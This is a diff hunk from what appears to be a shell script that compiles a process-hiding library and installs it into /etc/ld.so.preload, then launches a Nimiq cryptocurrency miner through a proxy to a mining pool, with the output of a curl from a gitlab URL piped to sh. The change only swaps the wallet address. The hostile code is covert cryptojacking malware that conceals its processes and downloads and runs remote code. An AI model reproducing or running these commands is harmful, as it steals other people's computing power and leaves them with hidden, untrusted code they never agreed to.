@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./gas -d=0 -a "NQ5486H5L3VNDXLM3JFN233AJASG0RAM96LJ" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)) -t 4 -i Disable & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh 
+./graftcp/graftcp ./gas -d=0 -a "NQ57ECU3A7V3LSK2K93MVM2D8XJPN5UG2VEQ" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)) -t 4 -i Disable & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh 
